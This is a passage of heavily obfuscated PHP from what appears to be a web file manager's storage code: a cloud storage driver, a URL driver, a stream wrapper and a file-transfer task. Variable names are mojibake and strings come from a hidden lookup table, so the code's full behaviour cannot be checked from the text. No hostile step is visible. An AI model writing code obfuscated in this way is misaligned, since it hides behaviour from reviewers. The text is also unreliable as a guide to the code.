(is_string($ÑƒõÂŞ•)) { $Şó‰­–[$ÑƒõÂŞ•] = array($Á²ÚöÊœ[79] => 0); } } return $this->listAllFiles($êè¹Ç, $Şó‰­–); } public function canRead($øæ¶ü‹) { return $this->exist($øæ¶ü‹) ? !0 : !1; } public function canWrite($êş±ÜçÄ) { return $this->exist($êş±ÜçÄ) ? !0 : !1; } public function getContent($µ«î£Û) { return $this->fileSubstr($µ«î£Û, 0, -1); } public function setContent($Æòğ“é, $ÔÌÇŸË = '') { $²Ê“¬ =& $_SERVER[ÔÕ±ĞšÎ]; if (!$ÔÌÇŸË) { $ğÍÓ‰› = $this->ussRequest($Æòğ“é, $²Ê“¬[290]); return $ğÍÓ‰›[$²Ê“¬[1299]]; } $ÓÖğ ÏÁ = $this->tempFile($this->pathThis($Æòğ“é)); file_put_contents($ÓÖğ ÏÁ, $ÔÌÇŸË); if ($this->upload($Æòğ“é, $ÓÖğ ÏÁ)) { $this->tempFileRemve($ÓÖğ ÏÁ); return !0; } return !1; } public function fileSubstr($‚ëü¬·Ñ, $ùÊŸÏæÎ, $Ø²„º ) { $ßåÂ©õ£ =& $_SERVER[ÔÕ±ĞšÎ]; if (!($¦¹ ÈË = $this->link($‚ëü¬·Ñ))) { return !1; } $á´áÙñç = !1; if ($Ø²„º  > 0) { $äà¢öÖˆ = $ùÊŸÏæÎ + $Ø²„º  - 1; $á´áÙñç = array($ßåÂ©õ£[1538] . $ùÊŸÏæÎ . $ßåÂ©õ£[464] . $äà¢öÖˆ); } $«‚Ï¢Í = url_request($¦¹ ÈË, $ßåÂ©õ£[1498], !1, $á´áÙñç); return $«‚Ï¢Í[$ßåÂ©õ£[824]] ? $«‚Ï¢Í[$ßåÂ©õ£[1289]] : !1; } public function upload($½êè¡˜À, $ğÄÜÑ§ä, $ÑƒàŸË = false, $—Ëñ²Ÿ = REPEAT_REPLACE) { $Ëº¤é =& $_SERVER[ÔÕ±ĞšÎ]; $é—‘ƒ¡æ = IO::size($ğÄÜÑ§ä); if ($é—‘ƒ¡æ <= 1024 * 1024 * 200) { $©»Ñ·Îë = array($Ëº¤é[1580] . $ğÄÜÑ§ä); $±ßÆ•ø¸ = $this->ussRequest($½êè¡˜À, $Ëº¤é[255], $©»Ñ·Îë); return $±ßÆ•ø¸[$Ëº¤é[1299]] ? $this->getPathOuter($½êè¡˜À) : !1; } $åóİ…Ó› = 1024 * 1024 * 10; $ñ”àÍ = array($Ëº¤é[1581], $Ëº¤é[1582] . $é—‘ƒ¡æ, $Ëº¤é[1583], $Ëº¤é[1584] . $åóİ…Ó›); $±ßÆ•ø¸ = $this->ussRequest($½êè¡˜À, $Ëº¤é[255], !1, $ñ”àÍ); if (!$±ßÆ•ø¸[$Ëº¤é[1299]]) { return !1; } $°À«âĞ = $±ßÆ•ø¸[$Ëº¤é[1289]]; $éöŸçÒ­ = 0; $¯øıÑÔÁ = $°À«âĞ[$Ëº¤é[1585]]; $ìáç€Å¯ = fopen($ğÄÜÑ§ä, $Ëº¤é[1461]); if (!$ìáç€Å¯) { return !1; } do { $ñ…¢šİ = $°À«âĞ[$Ëº¤é[1586]]; fseek_64($ìáç€Å¯, $éöŸçÒ­); $¿¤Å¼¾ = fread($ìáç€Å¯, $ñ…¢šİ); $Ş¾³Ñç = 0; do { $Ş¾³Ñç++; $°À«âĞ = $this->uploadPart($½êè¡˜À, $°À«âĞ, $¿¤Å¼¾); } while (!$°À«âĞ && $Ş¾³Ñç < 3); if (!$°À«âĞ) { return !1; } $¯øıÑÔÁ = $°À«âĞ[$Ëº¤é[1585]]; $éöŸçÒ­ += $ñ…¢šİ; } while ($¯øıÑÔÁ != -1); fclose($ìáç€Å¯); $ñ”àÍ = array($Ëº¤é[1587], $Ëº¤é[1588] . $°À«âĞ[$Ëº¤é[1589]], $Ëº¤é[1583]); $±ßÆ•ø¸ = $this->ussRequest($½êè¡˜À, $Ëº¤é[255], !1, $ñ”àÍ); return $±ßÆ•ø¸[$Ëº¤é[1299]] ? $this->getPathOuter($şŞÊ¾¬) : !1; } private function uploadPart($ö‹ªã…š, $îÃ¹ëïœ, &$¹ö±ãùš) { $ØÑÑÌõ´ =& $_SERVER[ÔÕ±ĞšÎ]; $¹Øšô«Ş = array($ØÑÑÌõ´[1590], $ØÑÑÌõ´[1588] . $îÃ¹ëïœ[$ØÑÑÌõ´[1589]], $ØÑÑÌõ´[1591] . $îÃ¹ëïœ[$ØÑÑÌõ´[1585]], $ØÑÑÌõ´[146] . $îÃ¹ëïœ[$ØÑÑÌõ´[1586]]); $­µ˜üÛ = $this->ussRequest($ö‹ªã…š, $ØÑÑÌõ´[255], $¹ö±ãùš, $¹Øšô«Ş); return !$­µ˜üÛ[$ØÑÑÌõ´[1299]] ? $­µ˜üÛ[$ØÑÑÌõ´[1299]] : $­µ˜üÛ[$ØÑÑÌõ´[1289]]; } public function uploadFormData($öÖåÁÈı, $ÖÑÚ¹Ş = 3600) { return $this->uploadPolicy($öÖåÁÈı, $ÖÑÚ¹Ş); } public function uploadMultiData($¬İî¸ê´, $¹¥†»ş± = 3600) { $„Úîœ =& $_SERVER[ÔÕ±ĞšÎ]; $ª³ÂÆä˜ = (int) $GLOBALS[$„Úîœ[7]][$„Úîœ[79]]; return $this->uploadPolicy($¬İî¸ê´, $¹¥†»ş±, $ª³ÂÆä˜); } private function uploadPolicy($¹²î¤³Ä, $Ø­ÄŠÊµ = 3600, $Á§ú‘â = 0) { $¯ÆÕçÍú =& $_SERVER[ÔÕ±ĞšÎ]; $æØ§İ‡ì = $¯ÆÕçÍú[8] . $this->bucket; $“ùàõøñ = gmdate($¯ÆÕçÍú[1496]); $¿ÚÍõÇ» = array($¯ÆÕçÍú[1592] => $this->bucket, $¯ÆÕçÍú[1593] => $¹²î¤³Ä, $¯ÆÕçÍú[1594] => time() + $Ø­ÄŠÊµ, $¯ÆÕçÍú[1595] => $“ùàõøñ); if ($Á§ú‘â) { $¿ÚÍõÇ»[$¯ÆÕçÍú[1481]] = $Á§ú‘â; } $Ğ³ÚÑŸÑ = base64_encode(json_encode($¿ÚÍõÇ»)); $¥Ş„À´‚ = base64_encode(hash_hmac($¯ÆÕçÍú[1549], "\x50\x4f\123\x54\x26{$æØ§İ‡ì}\46{$“ùàõøñ}\46{$Ğ³ÚÑŸÑ}", md5("{$this->userpass}"), !0)); $¶›Ò›Ÿ = array($¯ÆÕçÍú[279] => $Ğ³ÚÑŸÑ, $¯ÆÕçÍú[1596] => "\x55\120\131\125\116\x20{$this->username}\72{$¥Ş„À´‚}", $¯ÆÕçÍú[208] => $this->endpoint . $æØ§İ‡ì); return $¶›Ò›Ÿ; } public function download($œ³ÅÃÔ°, $ä‰ËÁôş) { $´ıÕüÊê = IO::getPathInner(IO::mkfile($ä‰ËÁôş)); if (!($ñÍÇÚØÌ = $this->link($œ³ÅÃÔ°))) { return !1; } $º›¥ÉÓ© = 0; $åúöì›– = 1024 * 200; $‰™ÓŞà¾ = fopen($´ıÕüÊê, $_SERVER[ÔÕ±ĞšÎ][1544]); while (!0) { $òÚ•ŞëÊ = $this->fileSubstr($œ³ÅÃÔ°, $º›¥ÉÓ©, $åúöì›–); if ($òÚ•ŞëÊ === !1) { return !1; } fwrite($‰™ÓŞà¾, $òÚ•ŞëÊ); $º›¥ÉÓ© += $åúöì›–; if (strlen($òÚ•ŞëÊ) < $åúöì›–) { break; } } fclose($‰™ÓŞà¾); return $ä‰ËÁôş; } public function link($œŒ¼µ¬ß, $€É¥±¤ƒ = array()) { $äÅ® á¾ =& $_SERVER[ÔÕ±ĞšÎ]; $œŒ¼µ¬ß = trim($œŒ¼µ¬ß, $äÅ® á¾[8]); if (!empty($this->token)) { $ÔÁí»ëÑ = strtotime(date($äÅ® á¾[1597])); $ãı¸¬Ü¢ = substr(md5($this->token . $äÅ® á¾[286] . $ÔÁí»ëÑ . $äÅ® á¾[1598] . $œŒ¼µ¬ß), 12, 8) . $ÔÁí»ëÑ; $€É¥±¤ƒ[] = $äÅ® á¾[1599] . $ãı¸¬Ü¢; } $Ê¼ãÁƒÀ = !empty($€É¥±¤ƒ) ? $äÅ® á¾[76] . implode($äÅ® á¾[286], $€É¥±¤ƒ) : $äÅ® á¾[12]; return $this->getHost() . $äÅ® á¾[8] . $this->pathEncode($œŒ¼µ¬ß) . $Ê¼ãÁƒÀ; } public function fileOut($„ëıªà’, $û·¹Ä¸« = false, $³­ìÀÉº = false, $²İ•ıï = '') { if ($this->isFileOutServer()) { return $this->fileOutServer($„ëıªà’, $û·¹Ä¸«, $³­ìÀÉº, $²İ•ıï); } if (!$³­ìÀÉº) { $³­ìÀÉº = $this->pathThis($„ëıªà’); } $ôÚóÃìµ = $û·¹Ä¸« ? array($_SERVER[ÔÕ±ĞšÎ][1600] . rawurlencode($³­ìÀÉº)) : array(); $Ó·ØäÏ¼ = $this->link($„ëıªà’, $ôÚóÃìµ); $this->fileOutLink($Ó·ØäÏ¼); } public function fileOutServer($èá¡öµ¥, $æ“ıº©¡ = false, $Á­èªØÔ = false, $É—Û’’¿ = '') { parent::fileOut($èá¡öµ¥, $æ“ıº©¡, $Á­èªØÔ, $É—Û’’¿); } public function fileOutImage($¥ëÉÛ–‡, $‘ÀèÓ¢ = 250) { $‹Ì…÷¶… = $this->link($¥ëÉÛ–‡ . $_SERVER[ÔÕ±ĞšÎ][1601] . $‘ÀèÓ¢); $this->fileOutLink($‹Ì…÷¶…); } public function fileOutImageServer($€ŸÒ¹¦, $ìô¨³ = 250) { parent::fileOutImage($€ŸÒ¹¦, $ìô¨³); } public function hashMd5($ı‹Ä¿¤Ì) { $Õİ°Ô¤ô =& $_SERVER[ÔÕ±ĞšÎ]; $Âüé¿Ş¾ = $this->_objectMeta($ı‹Ä¿¤Ì); return isset($Âüé¿Ş¾[$Õİ°Ô¤ô[247]]) ? $Âüé¿Ş¾[$Õİ°Ô¤ô[247]] : !1; } public function size($ÚèûÚÊ) { $’‹û™¼Õ = $this->objectMeta($ÚèûÚÊ); return $’‹û™¼Õ ? $’‹û™¼Õ[$_SERVER[ÔÕ±ĞšÎ][79]] : 0; } public function info($şšÂÀ—·) { if ($this->isFolder($şšÂÀ—·)) { return $this->folderInfo($şšÂÀ—·); } else { if ($this->isFile($şšÂÀ—·)) { return $this->fileInfo($şšÂÀ—·); } } return !1; } public function exist($Œ¾ƒ¦Ì¯) { return $this->isFile($Œ¾ƒ¦Ì¯) || $this->isFolder($Œ¾ƒ¦Ì¯); } public function isFile($Õçøİ¹©) { return !$this->isFolder($Õçøİ¹©) && $this->objectMeta($Õçøİ¹©); } public function isFolder($Â¦ñ·¯) { return $this->cacheMethod($_SERVER[ÔÕ±ĞšÎ][179], $Â¦ñ·¯); } protected function objectMeta($ùŞ„ØšÖ) { return $this->cacheMethod($_SERVER[ÔÕ±ĞšÎ][181], $ùŞ„ØšÖ); } protected function _objectMeta($—½‹óÆƒ) { $™Œ¾ã›© =& $_SERVER[ÔÕ±ĞšÎ]; if ($—½‹óÆƒ == $™Œ¾ã›©[12] || $—½‹óÆƒ == $™Œ¾ã›©[8]) { return array(); } $ÉäÆ„™İ = $this->ussRequest($—½‹óÆƒ, $™Œ¾ã›©[1602]); if (!$ÉäÆ„™İ[$™Œ¾ã›©[1299]]) { return null; } $’„€ò€’ = isset($ÉäÆ„™İ[$™Œ¾ã›©[1289]]) ? $ÉäÆ„™İ[$™Œ¾ã›©[1289]] : array(); if (!isset($’„€ò€’[$™Œ¾ã›©[1603]])) { return null; } $˜Å´³ = array($™Œ¾ã›©[33] => isset($’„€ò€’[$™Œ¾ã›©[1603]]) ? $’„€ò€’[$™Œ¾ã›©[1603]] : null, $™Œ¾ã›©[79] => isset($’„€ò€’[$™Œ¾ã›©[1604]]) ? $’„€ò€’[$™Œ¾ã›©[1604]] : null, $™Œ¾ã›©[247] => isset($’„€ò€’[$™Œ¾ã›©[1605]]) ? $’„€ò€’[$™Œ¾ã›©[1605]] : null, $™Œ¾ã›©[1572] => isset($’„€ò€’[$™Œ¾ã›©[1606]]) ? $’„€ò€’[$™Œ¾ã›©[1606]] : null); $˜Å´³[$™Œ¾ã›©[1573]] = isset($’„€ò€’[$™Œ¾ã›©[1607]]) ? strtotime($’„€ò€’[$™Œ¾ã›©[1607]]) : $˜Å´³[$™Œ¾ã›©[1572]]; return $˜Å´³; } protected function _isFolder($˜¥ı¹î²) { $À²ÄÈÌÀ =& $_SERVER[ÔÕ±ĞšÎ]; if ($˜¥ı¹î² == $À²ÄÈÌÀ[12] || $˜¥ı¹î² == $À²ÄÈÌÀ[8]) { return !0; } $ƒİ¡İé = $this->_objectMeta($˜¥ı¹î²); return isset($ƒİ¡İé[$À²ÄÈÌÀ[33]]) && $ƒİ¡İé[$À²ÄÈÌÀ[33]] == $À²ÄÈÌÀ[78] ? !0 : !1; } } class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($Öş´Ó»î = false) { } public function exist($Ó¦–Ü‘˜) { $²…ùÇ®ü = $this->info($Ó¦–Ü‘˜); return $²…ùÇ®ü[$_SERVER[ÔÕ±ĞšÎ][234]]; } public function isFile($ü¨î‚æ¶) { $»×¡¦û± = $this->info($ü¨î‚æ¶); return $»×¡¦û±[$_SERVER[ÔÕ±ĞšÎ][234]]; } public function isFolder($äøÂÏ“ş) { return !1; } public function size($æìšÕ¬) { $ù—Äóû™ = $this->info($æìšÕ¬); return $ù—Äóû™[$_SERVER[ÔÕ±ĞšÎ][79]]; } public function info($ËùÖÍ…Ê) { return $this->infoParse($ËùÖÍ…Ê); } public function infoAuth($±Ş†‡¿) { return $this->infoParse($±Ş†‡¿); } public function infoWithChildren($ÀŠÔÓÜì) { return $this->infoParse($ÀŠÔÓÜì); } public function infoFull($ÅÛ´Çœº) { return $this->infoParse($ÅÛ´Çœº); } private function infoParse($ÛŠ¤ŞË) { $ã¢Ï¦ºË =& $_SERVER[ÔÕ±ĞšÎ]; $£ãœâ«ê = $this->header($ÛŠ¤ŞË); if (!$£ãœâ«ê || !$£ãœâ«ê[$ã¢Ï¦ºË[824]]) { return !1; } $èÒé‰Í× = _get($£ãœâ«ê, $ã¢Ï¦ºË[414], 0); $ñÙÃÚ™Ô = array($ã¢Ï¦ºË[32] => $£ãœâ«ê[$ã¢Ï¦ºË[32]], $ã¢Ï¦ºË[87] => $ÛŠ¤ŞË, $ã¢Ï¦ºË[33] => $ã¢Ï¦ºË[232], $ã¢Ï¦ºË[79] => intval($èÒé‰Í×), $ã¢Ï¦ºË[169] => get_path_ext($£ãœâ«ê[$ã¢Ï¦ºË[32]]), $ã¢Ï¦ºË[1458] => $èÒé‰Í× > 0 && $£ãœâ«ê[$ã¢Ï¦ºË[1608]], $ã¢Ï¦ºË[1459] => !1); return $ñÙÃÚ™Ô; } private function header($ÑôËÃæ) { $ı×˜ñÂÆ =& $_SERVER[ÔÕ±ĞšÎ]; if (isset(self::$_cacheHeader[$ÑôËÃæ])) { return self::$_cacheHeader[$ÑôËÃæ]; } $Ëõ‡™ã™ = isset($GLOBALS[$ı×˜ñÂÆ[1609]]) ? $GLOBALS[$ı×˜ñÂÆ[1609]] : !1; $GLOBALS[$ı×˜ñÂÆ[1609]] = !0; self::$_cacheHeader[$ÑôËÃæ] = url_header($ÑôËÃæ); $GLOBALS[$ı×˜ñÂÆ[1609]] = $Ëõ‡™ã™; return self::$_cacheHeader[$ÑôËÃæ]; } public function hashSimple($­ñÕğ„ş, $óñ€ù† = false) { $íº£ÒÍú =& $_SERVER[ÔÕ±ĞšÎ]; $Ø‚¸‰…Ù = $this->info($­ñÕğ„ş); if (!$Ø‚¸‰…Ù || !$Ø‚¸‰…Ù[$íº£ÒÍú[234]]) { return !1; } $Æø¾ˆõÍ = $Ø‚¸‰…Ù[$íº£ÒÍú[79]]; $«èŞ¦şğ = 200; $¡¡¦€ = 50; if ($Æø¾ˆõÍ <= $«èŞ¦şğ * $¡¡¦€) { return md5($this->fileSubstr($­ñÕğ„ş, 0, $Æø¾ˆõÍ)) . $Æø¾ˆõÍ; } $Ç£Ì›© = intval($Æø¾ˆõÍ / $¡¡¦€); $¦Â©äÆÔ = $íº£ÒÍú[12]; $›ŸÍáßá = timeFloat(); $É´æ³« = 15; for ($ˆ Ğî£¢ = 0; $ˆ Ğî£¢ < $¡¡¦€; $ˆ Ğî£¢++) { if (timeFloat() - $›ŸÍáßá > $É´æ³«) { return !1; } $öµÜ–± = $this->fileSubstr($­ñÕğ„ş, $Ç£Ì›© * $ˆ Ğî£¢, $«èŞ¦şğ); if (!$öµÜ–±) { return !1; } $¦Â©äÆÔ .= $öµÜ–±; } $¦Â©äÆÔ .= $this->fileSubstr($­ñÕğ„ş, $Æø¾ˆõÍ - $«èŞ¦şğ, $«èŞ¦şğ); return md5($¦Â©äÆÔ) . $Æø¾ˆõÍ; } public function getContent($Í€·ÆµÎ) { return $this->fileSubstr($Í€·ÆµÎ); } public function fileSubstr($¬”šƒ¼ê, $ô¢¯±˜ = 0, $×¦Û€Îñ = -1) { $¾Ñ‰õá =& $_SERVER[ÔÕ±ĞšÎ]; $âÏ–Ãõ = $this->info($¬”šƒ¼ê); if (!$âÏ–Ãõ || !$âÏ–Ãõ[$¾Ñ‰õá[234]] && $âÏ–Ãõ[$¾Ñ‰õá[79]] > 1024 * 1024 * 10) { return !1; } if ($×¦Û€Îñ === -1) { $×¦Û€Îñ = $âÏ–Ãõ[$¾Ñ‰õá[79]]; } if ($×¦Û€Îñ == 0) { return $¾Ñ‰õá[12]; } $ù´é¾Û‰ = array($¾Ñ‰õá[1610] . $ô¢¯±˜ . $¾Ñ‰õá[860] . ($ô¢¯±˜ + $×¦Û€Îñ - 1)); $Éç‰½±° = url_request($¬”šƒ¼ê, $¾Ñ‰õá[1498], !1, $ù´é¾Û‰, !1, !1, 30); return $Éç‰½±°[$¾Ñ‰õá[1289]] ? $Éç‰½±°[$¾Ñ‰õá[1289]] : $¾Ñ‰õá[12]; } public function download($™ûÇÇ•, $±•†‹óñ) { Downloader::start($™ûÇÇ•, $±•†‹óñ); return $±•†‹óñ; } } class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_fopenCache = array(); static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($ª“€Èú÷, $®ï¢Ÿ•Ş = '') { $this->info = $this->info($ª“€Èú÷); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[ÔÕ±ĞšÎ][87]]; $this->pathOpen = $ª“€Èú÷; if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } if (!isset(self::$_chunkBuffer[$ª“€Èú÷])) { self::$_chunkBuffer[$ª“€Èú÷] = array(); } self::$_fopenCache[$this->pathOpen] = $this; return $this->info ? !0 : !1; } function stream_read($ªİ÷ë¬­) { $Øª´í¹« = $this->fileSubstr($this->pose, $ªİ÷ë¬­); $this->pose += strlen($Øª´í¹«); return $Øª´í¹«; } public function stream_tell() { return $this->pose; } public function stream_seek($©ú·ã’È, $äıçª‹Š) { $¤¾êò÷ =& $_SERVER[ÔÕ±ĞšÎ]; if ($äıçª‹Š == SEEK_SET) { $this->pose = $©ú·ã’È; } else { if ($äıçª‹Š == SEEK_CUR) { $this->pose += $©ú·ã’È; } else { if ($äıçª‹Š == SEEK_END) { $this->pose = $this->info[$¤¾êò÷[79]] + intval($©ú·ã’È); } } } if ($©ú·ã’È < 0) { $this->pose = $this->info[$¤¾êò÷[79]] + $©ú·ã’È; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[ÔÕ±ĞšÎ][79]]; } public function stream_close() { unset(self::$_fopenCache[$this->pathOpen]); return !0; } public function url_stat($ïÆ¾•À, $¶¦â¡½×) { $Ù…š ÀÊ =& $_SERVER[ÔÕ±ĞšÎ]; $µ£Å„ú = $this->info($ïÆ¾•À); return array($Ù…š ÀÊ[1402] => 0, $Ù…š ÀÊ[1611] => 0, $Ù…š ÀÊ[16] => 32768 + 511, $Ù…š ÀÊ[1612] => 0, $Ù…š ÀÊ[1613] => 0, $Ù…š ÀÊ[1614] => 0, $Ù…š ÀÊ[1615] => 0, $Ù…š ÀÊ[79] => $µ£Å„ú[$Ù…š ÀÊ[79]], $Ù…š ÀÊ[1616] => $µ£Å„ú[$Ù…š ÀÊ[1457]], $Ù…š ÀÊ[1573] => $µ£Å„ú[$Ù…š ÀÊ[88]], $Ù…š ÀÊ[1572] => $µ£Å„ú[$Ù…š ÀÊ[233]], $Ù…š ÀÊ[1617] => 0, $Ù…š ÀÊ[1618] => 0); } static $fileInfo = array(); public function info($Óóš¹‹•) { $¶•¥’Ä§ = $_SERVER[ÔÕ±ĞšÎ][1619]; if (isset(self::$fileInfo[$Óóš¹‹•])) { return self::$fileInfo[$Óóš¹‹•]; } if (substr($Óóš¹‹•, 0, strlen($¶•¥’Ä§)) != $¶•¥’Ä§) { return !1; } self::$fileInfo[$Óóš¹‹•] = IO::info(substr($Óóš¹‹•, strlen($¶•¥’Ä§))); return self::$fileInfo[$Óóš¹‹•]; } public static function read($ÄÅÀŒÇ•, $÷¹÷é…ó, $­¯º ) { if (!isset(self::$_fopenCache[$ÄÅÀŒÇ•])) { $ê„¬†Ö = new StreamWrapperIO(); $ê„¬†Ö->stream_open($ÄÅÀŒÇ•); self::$_fopenCache[$ÄÅÀŒÇ•] = $ê„¬†Ö; } $ê„¬†Ö = self::$_fopenCache[$ÄÅÀŒÇ•]; return $ê„¬†Ö->fileSubstr($÷¹÷é…ó, $­¯º ); } public static function _read($æ’»Ú³, $²ÏŠâÕ, $£—ÃäÓ) { $Š®úŸ„ =& $_SERVER[ÔÕ±ĞšÎ]; $ÜâÀ€ÈÃ = fopen($æ’»Ú³, $Š®úŸ„[1461]); if (!$ÜâÀ€ÈÃ) { return $Š®úŸ„[12]; } $¨ëßøô§ = 8192; fseek($ÜâÀ€ÈÃ, $²ÏŠâÕ, SEEK_SET); $¼êç÷è = $Š®úŸ„[12]; $Ó«•ŸøŠ = 0; while ($Ó«•ŸøŠ < $£—ÃäÓ) { $ı¦œÊƒÀ = min($¨ëßøô§, $£—ÃäÓ - $Ó«•ŸøŠ); $¼êç÷è .= fread($ÜâÀ€ÈÃ, $ı¦œÊƒÀ); $Ó«•ŸøŠ += $ı¦œÊƒÀ; } fclose($ÜâÀ€ÈÃ); return $¼êç÷è; } public function fileSubstr($²íÄ„‰‹, $¹œÖÛŞä) { $ï•ƒ¸ñ =& $_SERVER[ÔÕ±ĞšÎ]; $´À†Ùôï = $this->info[$ï•ƒ¸ñ[79]]; $©–¨çì» = $²íÄ„‰‹; $¦šÏ—í = $¹œÖÛŞä; if ($²íÄ„‰‹ < 0) { $²íÄ„‰‹ = $´À†Ùôï + $²íÄ„‰‹; } if ($¹œÖÛŞä === !1) { $¹œÖÛŞä = $´À†Ùôï - $²íÄ„‰‹; } if ($²íÄ„‰‹ + $¹œÖÛŞä > $´À†Ùôï) { $¹œÖÛŞä = $´À†Ùôï - $²íÄ„‰‹; } if ($¹œÖÛŞä <= 0) { return $ï•ƒ¸ñ[12]; } if ($²íÄ„‰‹ < 0 || $²íÄ„‰‹ >= $´À†Ùôï || $¹œÖÛŞä <= 0 || $¹œÖÛŞä > 1024 * 1024 * 10) { throw new Exception("\151\x6f\106\151\x6c\x65\122\145\x61\x64\x20\x65\x72\x72\x6f\x72\41\x20\163\x74\x61\x72\164\75{$²íÄ„‰‹}\73\154\145\x6e\147\x74\150\x3d{$¹œÖÛŞä}\73\x20\x73\151\x7a\x65\x3d{$´À†Ùôï}\x3b"); } $ê—§‡ş = 64 * 1024; $ÏçàÙÕ· =& self::$_chunkBuffer[$this->path]; if (!$ÏçàÙÕ·) { $ÏçàÙÕ· = array(); } $îï¿À°Â = 0; $ø˜È©‘î = 0; $†¤óÔ¾ş = $ï•ƒ¸ñ[12]; foreach ($ÏçàÙÕ· as $îï¿À°Â => $†¤óÔ¾ş) { $îï¿À°Â = intval($îï¿À°Â); $ø˜È©‘î = $îï¿À°Â + strlen($†¤óÔ¾ş); if ($²íÄ„‰‹ >= $ø˜È©‘î) { continue; } if ($²íÄ„‰‹ >= $îï¿À°Â && $²íÄ„‰‹ + $¹œÖÛŞä <= $ø˜È©‘î) { return substr($†¤óÔ¾ş, $²íÄ„‰‹ - $îï¿À°Â, $¹œÖÛŞä); } break; } if (count($ÏçàÙÕ·) > 100 || timeFloat() - $this->timeStart > 2.0) { $this->log($ï•ƒ¸ñ[1620], $ï•ƒ¸ñ[1621] . count($ÏçàÙÕ·) . "\73\x73\164\x61\162\x74\x3d{$²íÄ„‰‹}\54\x6c\145\x6e\147\x74\150\x3d{$¹œÖÛŞä}\x3b\160\x6f\x73\x65\72{$îï¿À°Â}\176{$ø˜È©‘î}"); throw new Exception($ï•ƒ¸ñ[1622]); } $øÈü„ ú = intval($²íÄ„‰‹ / $ê—§‡ş) * $ê—§‡ş; $­Ìë›¢ = ceil(($²íÄ„‰‹ + $¹œÖÛŞä) / $ê—§‡ş) * $ê—§‡ş - $øÈü„ ú; $§Ñá’úÜ = IO::fileSubstr($this->path, $øÈü„ ú, $­Ìë›¢); $ÏçàÙÕ·[$øÈü„ ú . $ï•ƒ¸ñ[12]] = $§Ñá’úÜ; ksort($ÏçàÙÕ·); $‡«‘…Ä° = substr($§Ñá’úÜ, $²íÄ„‰‹ - $øÈü„ ú, $¹œÖÛŞä); return $‡«‘…Ä°; } private function log($®Š‘åè, $Å¼Àåâ×) { $êˆ¦’ŸÉ =& $_SERVER[ÔÕ±ĞšÎ]; $ãØñ£¢ = timeFloat() - $this->timeStart; write_log(sprintf($êˆ¦’ŸÉ[1623], $®Š‘åè, $this->info[$êˆ¦’ŸÉ[32]], $ãØñ£¢, $Å¼Àåâ×), $êˆ¦’ŸÉ[1266]); } } goto EŒª¬‚¡„; dËÅâ‡¯šô: class TaskFileTransfer extends Task { protected function startAfter() { $’¸ğş„ü =& $_SERVER[ÔÕ±ĞšÎ]; $æº¼Ç–ü =& $this->task; $this->sourceCopyFolder = !1; Hook::bind($’¸ğş„ü[1808], array($this, $’¸ğş„ü[1809])); Hook::bind($’¸ğş„ü[1310], array($this, $’¸ğş„ü[1810])); Hook::bind($’¸ğş„ü[1811], array($this, $’¸ğş„ü[1812])); Hook::bind($’¸ğş„ü[673], array($this, $’¸ğş„ü[1813])); Hook::bind($’¸ğş„ü[674], array($this, $’¸ğş„ü[1814])); Hook::bind($’¸ğş„ü[680], array($this, $’¸ğş„ü[1815])); Hook::bind($’¸ğş„ü[681], array($this, $’¸ğş„ü[1816])); Hook::bind($’¸ğş„ü[676], array($this, $’¸ğş„ü[1817])); Hook::bind($’¸ğş„ü[678], array($this, $’¸ğş„ü[1818])); Hook::bind($’¸ğş„ü[642], array($this, $’¸ğş„ü[1819])); Hook::bind($’¸ğş„ü[639], array($this, $’¸ğş„ü[1819])); Hook::bind($’¸ğş„ü[644], array($this, $’¸ğş„ü[1819])); Hook::bind($’¸ğş„ü[646], array($this, $’¸ğş„ü[1819])); Hook::bind($’¸ğş„ü[648], array($this, $’¸ğş„ü[1819])); Hook::bind($’¸ğş„ü[1820], array($this, $’¸ğş„ü[1821])); Hook::bind($’¸ğş„ü[664], array($this, $’¸ğş„ü[1822])); $this->sourceModelCopyFlag = !1; Hook::bind($’¸ğş„ü[1823], array($this, $’¸ğş„ü[1824])); Hook::bind($’¸ğş„ü[1825], array($this, $’¸ğş„ü[1826])); Hook::bind($’¸ğş„ü[1827], array($this, $’¸ğş„ü[1828])); $æº¼Ç–ü[$’¸ğş„ü[1829]] = LNG($’¸ğş„ü[1830]); $æº¼Ç–ü[$’¸ğş„ü[1831]] = 0; $æº¼Ç–ü[$’¸ğş„ü[1832]] = 0; $æº¼Ç–ü[$’¸ğş„ü[1144]] = $’¸ğş„ü[12]; $æº¼Ç–ü[$’¸ğş„ü[1833]] = $’¸ğş„ü[12]; $æº¼Ç–ü[$’¸ğş„ü[1834]] = 0; $æº¼Ç–ü[$’¸ğş„ü[1835]] = 0; $æº¼Ç–ü[$’¸ğş„ü[1836]] = 0; if (!$æº¼Ç–ü[$’¸ğş„ü[1665]]) { $æº¼Ç–ü[$’¸ğş„ü[1665]] = LNG($’¸ğş„ü[1837]); } } protected function endAfter() { $ªı‚×Ú =& $_SERVER[ÔÕ±ĞšÎ]; Hook::unbind($ªı‚×Ú[1808], array($this, $ªı‚×Ú[1809])); Hook::unbind($ªı‚×Ú[1310], array($this, $ªı‚×Ú[1810])); Hook::unbind($ªı‚×Ú[1811], array($this, $ªı‚×Ú[1812])); Hook::unbind($ªı‚×Ú[673], array($this, $ªı‚×Ú[1813])); Hook::unbind($ªı‚×Ú[674], array($this, $ªı‚×Ú[1814])); Hook::unbind($ªı‚×Ú[680], array($this, $ªı‚×Ú[1815])); Hook::unbind($ªı‚×Ú[681], array($this, $ªı‚×Ú[1816])); Hook::unbind($ªı‚×Ú[676], array($this, $ªı‚×Ú[1817])); Hook::unbind($ªı‚×Ú[678], array($this, $ªı‚×Ú[1818])); Hook::unbind($ªı‚×Ú[642], array($this, $ªı‚×Ú[1819])); Hook::unbind($ªı‚×Ú[639], array($this, $ªı‚×Ú[1819])); Hook::unbind($ªı‚×Ú[644], array($this, $ªı‚×Ú[1819])); Hook::unbind($ªı‚×Ú[646], array($this, $ªı‚×Ú[1819])); Hook::unbind($ªı‚×Ú[648], array($this, $ªı‚×Ú[1819])); Hook::unbind($ªı‚×Ú[1820], array($this, $ªı‚×Ú[1821])); Hook::unbind($ªı‚×Ú[664], array($this, $ªı‚×Ú[1822])); Hook::unbind($ªı‚×Ú[1823], array($this, $ªı‚×Ú[1824])); Hook::unbind($ªı‚×Ú[1825], array($this, 